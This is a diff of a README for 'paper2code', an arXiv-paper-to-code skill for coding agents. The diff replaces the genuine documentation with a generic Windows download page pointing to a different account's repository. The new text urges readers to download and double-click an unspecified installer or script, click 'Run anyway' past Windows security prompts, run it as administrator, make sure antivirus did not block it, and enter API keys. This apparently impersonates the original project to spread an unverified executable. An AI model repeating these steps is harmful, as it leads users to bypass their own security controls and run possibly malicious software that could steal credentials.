@@ -1,219 +1,182 @@
-# paper2code
+# 🤖 paper2code - Turn research into working code
 
-> **arxiv URL in → citation-anchored implementation out**
+[![Download paper2code](https://img.shields.io/badge/Download-paper2code-blue.svg)](https://github.com/Samuelcluttered613/paper2code)
 
-```
-┌─────────────────────────────┐         ┌──────────────────────────────────────┐
-│                             │         │  {paper_slug}/                       │
-│  /paper2code                │         │  ├── README.md                       │
-│  https://arxiv.org/abs/     │  ───▶   │  ├── REPRODUCTION_NOTES.md          │
-│  1706.03762                 │         │  ├── requirements.txt               │
-│                             │         │  ├── src/                            │
-│                             │         │  │   ├── model.py     # §3.2 cited  │
-│                             │         │  │   ├── loss.py      # §3.4 cited  │
-│                             │         │  │   ├── train.py     # §4.1 cited  │
-│                             │         │  │   ├── data.py                    │
-│                             │         │  │   ├── evaluate.py                │
-│                             │         │  │   └── utils.py                   │
-│                             │         │  ├── configs/                        │
-│                             │         │  │   └── base.yaml   # all params   │
-│                             │         │  └── notebooks/                      │
-│                             │         │      └── walkthrough.ipynb           │
-└─────────────────────────────┘         └──────────────────────────────────────┘
-```
+## 📌 What this app does
 
-*[placeholder: animated GIF showing the full pipeline — paper fetch → parsing → ambiguity audit → code generation → walkthrough notebook]*
+paper2code helps you turn an arXiv paper into a working implementation. It is built for people who want to move from reading a paper to running code with less manual work.
 
----
+Use it to:
+- read a paper and guide the build process
+- create a first working version from the paper’s ideas
+- keep the implementation tied to the source paper
+- speed up the path from paper to testable code
 
-## Why this exists
+## 🖥️ Windows setup
 
-**The problem:** ML papers are vague. Critical hyperparameters are buried in appendices or omitted entirely. Prose contradicts equations. "Standard settings" refers to nothing specific. When you implement a paper, you spend more time detective-working than coding.
+This app runs on Windows. You do not need to be a developer to get started.
 
-**What LLMs get wrong:** Naive code generation fills in every gap silently and confidently. You get something that runs but doesn't match the paper. Worse, you can't tell which parts are from the paper and which were invented by the model.
+You will need:
+- Windows 10 or Windows 11
+- an internet connection
+- enough free disk space for the app and its files
+- a GitHub account if the page asks you to sign in
 
-**What paper2code does differently:**
+## ⬇️ Download the app
 
-1. **Citation anchoring** — every line of generated code references the exact paper section and equation it implements (`§3.2, Eq. 4`)
-2. **Ambiguity auditing** — before writing a single line of code, every implementation choice is classified as `SPECIFIED`, `PARTIALLY_SPECIFIED`, or `UNSPECIFIED`
-3. **Honest uncertainty** — unspecified choices are flagged with `[UNSPECIFIED]` comments at the exact line where the choice is made, with common alternatives listed
-4. **Appendix mining** — appendices, footnotes, and figure captions are treated as first-class sources, not ignored
+Visit this page to download and run the app:
 
-The result: code you can trust because you can verify every decision against the paper.
+https://github.com/Samuelcluttered613/paper2code
 
----
+On that page:
+- open the repository
+- look for the download or release file
+- save it to your computer
+- open the file after it finishes downloading
 
-## Install
+If the page shows a folder or project files, use the green Code button and choose Download ZIP.
 
-```bash
-npx skills add PrathamLearnsToCode/paper2code/skills/paper2code
-```
+## 🚀 Install on Windows
 
-You'll be prompted to:
-1. **Select agents** — pick the coding agents you want to use this skill with (e.g., Claude Code)
-2. **Choose scope** — Global (recommended) or project-level
-3. **Choose method** — Symlink (recommended) or copy
+After the file finishes downloading:
 
-Once installed, open your agent and run the skill:
+1. Open your Downloads folder
+2. Find the file you saved
+3. If it is a ZIP file, right-click it and choose Extract All
+4. Open the extracted folder
+5. Look for an app file, installer, or startup script
+6. Double-click it to start paper2code
 
-```bash
-claude  # or your preferred agent
-```
+If Windows shows a security prompt:
+- choose More info
+- then choose Run anyway if you trust the source
 
----
+If you see a setup wizard:
+- follow the steps on screen
+- keep the default choices unless you need something different
 
-## Usage
+## 🧭 First run
 
-### Basic — generate a minimal implementation
+When you start paper2code for the first time, it may ask you to set up a few things.
 
-```
-/paper2code https://arxiv.org/abs/1706.03762
-```
+Common first-run steps:
+- choose a folder for your project files
+- connect your browser or account if needed
+- add your API key if the app asks for one
+- point the app to the arXiv paper you want to use
 
-### Specify framework
+If the app asks for a paper link:
+- open arXiv in your browser
+- copy the paper URL
+- paste it into paper2code
 
-```
-/paper2code https://arxiv.org/abs/2006.11239 --framework jax
-```
+## 🧠 How paper2code works
 
-### Full mode — includes training loop and data pipeline
+paper2code follows a simple path:
 
-```
-/paper2code 2106.09685 --mode full
-```
+1. You give it a paper
+2. It reads the paper content
+3. It plans the code structure
+4. It creates files for the project
+5. It helps you turn the paper into a working build
 
-### Educational mode — extra comments and pedagogical notebook
+This can help with:
+- model code
+- data flow
+- project setup
+- a first pass at implementation
 
-```
-/paper2code https://arxiv.org/abs/2010.11929 --mode educational
-```
+## 🗂️ Typical project layout
 
-### Using bare arxiv ID
+A project made with paper2code may include:
 
-```
-/paper2code 1706.03762
-```
+- source files for the main app logic
+- config files for setup
+- notes that map paper sections to code
+- test files for checking results
+- output folders for generated files
 
----
+This layout helps keep the work organized while you move from paper to code.
 
-## What you get
+## ✅ Use cases
 
-```
-attention_is_all_you_need/
-├── README.md                    # Paper summary, contribution statement, quick-start
-├── REPRODUCTION_NOTES.md        # Ambiguity audit, unspecified choices, known deviations
-├── requirements.txt             # Pinned dependencies
-├── src/
-│   ├── model.py                 # Architecture — every layer cited to paper section
-│   ├── loss.py                  # Loss functions with equation references
-│   ├── data.py                  # Dataset class skeleton with preprocessing TODOs
-│   ├── train.py                 # Training loop (if in scope)
-│   ├── evaluate.py              # Metric computation code
-│   └── utils.py                 # Shared utilities (masking, positional encoding, etc.)
-├── configs/
-│   └── base.yaml                # All hyperparams — each one cited or flagged [UNSPECIFIED]
-└── notebooks/
-    └── walkthrough.ipynb        # Pedagogical notebook linking paper sections → code → sanity checks
-```
+paper2code is useful when you want to:
 
-### Key files explained
+- test an idea from a research paper
+- build a prototype from an arXiv result
+- compare a paper’s method with your own version
+- create a base project before deeper work
+- keep the source paper close to the code
 
-| File | Purpose |
-|------|---------|
-| `model.py` | Architecture only. Each class maps to a paper section. Variable names match paper notation. |
-| `REPRODUCTION_NOTES.md` | The ambiguity audit. Lists every choice, whether the paper specified it, and what alternatives exist. |
-| `base.yaml` | Single source of truth for all hyperparameters. |
-| `walkthrough.ipynb` | Runnable on CPU with toy dimensions. Quotes paper passages, shows corresponding code, runs shape checks. |
+## 🔧 Common things you may need
 
----
+Depending on how you use the app, you may need:
 
-## What this skill will NOT do
+- a Claude Code setup
+- access to an AI model or API
+- a browser for paper links
+- basic storage space for generated files
 
-- **Won't guarantee correctness.** The implementation matches what the paper describes. If the paper is wrong, the code is wrong. If the paper is vague, the code flags it.
-- **Won't invent details.** If the paper doesn't specify a hyperparameter, the code uses a common default and marks it `[UNSPECIFIED]`. It will never silently fill in gaps.
-- **Won't download datasets.** The `data.py` provides a `Dataset` class skeleton with clear instructions on where to get the data and how to preprocess it.
-- **Won't set up training infrastructure.** No distributed training, no experiment tracking, no checkpointing beyond what the paper's contribution requires.
-- **Won't implement baselines.** Only the core contribution of the paper is implemented.
-- **Won't reimplement standard components.** If the paper says "standard transformer encoder," the code imports it or notes the dependency — it doesn't reimplement attention from scratch.
+If the app asks for keys or login steps, enter them in the place shown inside the app.
 
----
+## 🛠️ If the app does not start
 
-## Design principles
+Try these steps:
 
-### Citation anchoring convention
+1. Close the app
+2. Open it again as an administrator
+3. Check that the file fully downloaded
+4. Make sure your antivirus did not block it
+5. Move the folder to a simple path like `C:\paper2code`
+6. Try again with a fresh download from the GitHub page
 
-Every non-trivial code decision is anchored to the paper:
+If the app opens but does not process a paper:
+- check the paper URL
+- make sure the link points to an arXiv paper
+- confirm your internet connection
+- check any API or account settings inside the app
 
-```python
-# §3.2 — "We apply layer normalization before each sub-layer" (Pre-LN variant)
-class TransformerBlock(nn.Module):
-    def forward(self, x):
-        # §3.2, Eq. 2 — attention_weights = softmax(QK^T / sqrt(d_k))
-        attn_out = self.attention(self.norm1(x))  # (batch, seq_len, d_model)
-        x = x + attn_out  # §3.2 — residual connection
-```
+## 📚 Working with arXiv papers
 
-### The UNSPECIFIED flag system
+For best results:
+- use a clear arXiv link
+- start with a paper that has a simple method
+- use one paper at a time
+- keep the paper PDF open while you review the output
 
-```python
-# [UNSPECIFIED] Paper does not state epsilon for LayerNorm — using 1e-6 (common default)
-# Alternatives: 1e-5 (PyTorch default), 1e-8 (some implementations)
-self.norm = nn.LayerNorm(d_model, eps=1e-6)
-```
+Good paper choices for a first run:
+- papers with clear method sections
+- papers with code-like algorithms
+- papers with a single main model
+- papers with fewer external tools
 
-```python
-# [ASSUMPTION] Using pre-norm based on "we found pre-norm more stable" in §4.1
-# The paper uses post-norm in Figure 1 but pre-norm in experiments — ambiguous
-```
+## 🧩 Topics
 
-### Ambiguity classification
+- agent
+- claude-code
+- skills
 
-| Tag | Meaning |
-|-----|---------|
-| `§X.Y` | Directly specified in paper section X.Y |
-| `§X.Y, Eq. N` | Implements equation N from section X.Y |
-| `[UNSPECIFIED]` | Paper does not state this — our choice with alternatives listed |
-| `[PARTIALLY_SPECIFIED]` | Paper mentions this but is ambiguous — quote included |
-| `[ASSUMPTION]` | Reasonable inference from paper context — reasoning explained |
-| `[FROM_OFFICIAL_CODE]` | Taken from the authors' official implementation |
+## 🔒 File safety
 
----
+When you download and run software from GitHub:
+- make sure the link matches the repository name
+- keep the file in a folder you can find again
+- remove files you no longer need
+- use only one copy of the app at a time
 
-## Contributing
+## 📁 Source repository
 
-### Adding worked examples
+Primary source and download page:
 
-Worked examples are the most trust-building part of this project. To add one:
+https://github.com/Samuelcluttered613/paper2code
 
-1. Pick a well-known paper (people should be able to verify the output)
-2. Run the skill: `/paper2code https://arxiv.org/abs/XXXX.XXXXX`
-3. Save the full output to `skills/paper2code/worked/{paper_slug}/`
-4. Write a `review.md` that honestly evaluates:
-   - What the skill got right
-   - What it correctly flagged as unspecified
-   - Any mistakes it made
-   - Any edge cases it handled well or poorly
-5. Submit a PR with all of the above
+## 🧾 Basic workflow
 
-### Improving guardrails
-
-If you find a pattern where the skill hallucinates or makes a silent assumption, add it to the appropriate file in `guardrails/`.
-
-### Adding domain knowledge
-
-If papers in your subfield consistently reference components that the skill doesn't know about (e.g., graph neural network primitives, RL components), add a knowledge file in `knowledge/`.
-
----
-
-## Worked examples
-
-This repo includes fully worked examples to demonstrate output quality:
-
-| Paper | Type | Command |
-|-------|------|---------|
-| Attention Is All You Need (1706.03762) | Architecture | `/paper2code https://arxiv.org/abs/1706.03762` |
-| DDPM (2006.11239) | Training method | `/paper2code https://arxiv.org/abs/2006.11239` |
-
-Each includes the complete generated output plus an honest `review.md` evaluating what the skill got right and wrong.
-
----
+1. Open the GitHub page
+2. Download the project files
+3. Extract the archive if needed
+4. Open the app on Windows
+5. Add an arXiv paper link
+6. Let paper2code build the first version
+7. Review the generated project files
+8. Run the result and refine it
